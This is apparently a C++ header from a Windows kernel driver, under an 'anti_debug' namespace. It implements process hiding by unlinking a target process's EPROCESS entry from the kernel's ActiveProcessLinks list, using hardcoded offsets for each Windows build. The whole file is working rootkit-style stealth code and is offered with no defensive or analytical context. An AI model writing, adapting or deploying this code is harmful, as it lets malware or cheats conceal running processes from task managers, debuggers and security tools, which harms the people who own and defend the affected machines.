#pragma once

namespace fusion::anti_debug
{
	ULONG get_active_process_links_offset( )
	{
		ULONG activeProcessLinks = ( ULONG ) STATUS_UNSUCCESSFUL;
		RTL_OSVERSIONINFOW osVersion = { sizeof( osVersion ) };
		NTSTATUS result = RtlGetVersion( &osVersion );

		if ( NT_SUCCESS( result ) )
		{
			switch ( osVersion.dwBuildNumber )
			{
				case WIN_1507:
				case WIN_1511:
				case WIN_1607:
				case WIN_1903:
				case WIN_1909:
					activeProcessLinks = 0x2f0;
					break;
				case WIN_1703:
				case WIN_1709:
				case WIN_1803:
				case WIN_1809:
					activeProcessLinks = 0x2e8;
					break;
				default:
					activeProcessLinks = 0x448;
					break;
			}
		}

		return activeProcessLinks;
	}

	void remove_process_links( PLIST_ENTRY current )
	{
		PLIST_ENTRY previous, next;

		/*
		* Changing the list from:
		* Prev <--> Current <--> Next
		*
		* To:
		*
		*   | ------------------------------
		*   v							   |
		* Prev        Current            Next
		*   |							   ^
		*   -------------------------------|
		*/

		previous = ( current->Blink );
		next = ( current->Flink );

		previous->Flink = next;
		next->Blink = previous;

		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
		current->Blink = ( PLIST_ENTRY ) &current->Flink;
		current->Flink = ( PLIST_ENTRY ) &current->Flink;
	}

	NTSTATUS hide_process( ULONG pid )
	{
		// Getting the offset depending on the OS version.
		ULONG pidOffset = get_active_process_links_offset( );

		if ( pidOffset == STATUS_UNSUCCESSFUL )
		{
			return STATUS_UNSUCCESSFUL;
		}
		ULONG listOffset = pidOffset + sizeof( INT_PTR );

		// Enumerating the EPROCESSes and finding the target pid.
		PEPROCESS currentEProcess = PsGetCurrentProcess( );
		PLIST_ENTRY currentList = ( PLIST_ENTRY ) ( ( ULONG_PTR ) currentEProcess + listOffset );
		PUINT32 currentPid = ( PUINT32 ) ( ( ULONG_PTR ) currentEProcess + pidOffset );

		if ( *( UINT32* ) currentPid == pid )
		{
			remove_process_links( currentList );
			return STATUS_SUCCESS;
		}

		PEPROCESS StartProcess = currentEProcess;

		currentEProcess = ( PEPROCESS ) ( ( ULONG_PTR ) currentList->Flink - listOffset );
		currentPid = ( PUINT32 ) ( ( ULONG_PTR ) currentEProcess + pidOffset );
		currentList = ( PLIST_ENTRY ) ( ( ULONG_PTR ) currentEProcess + listOffset );

		while ( ( ULONG_PTR ) StartProcess != ( ULONG_PTR ) currentEProcess )
		{
			if ( *( UINT32* ) currentPid == pid )
			{
				remove_process_links( currentList );
				return STATUS_SUCCESS;
			}

			currentEProcess = ( PEPROCESS ) ( ( ULONG_PTR ) currentList->Flink - listOffset );
			currentPid = ( PUINT32 ) ( ( ULONG_PTR ) currentEProcess + pidOffset );
			currentList = ( PLIST_ENTRY ) ( ( ULONG_PTR ) currentEProcess + listOffset );
		}

		return STATUS_SUCCESS;
	}
}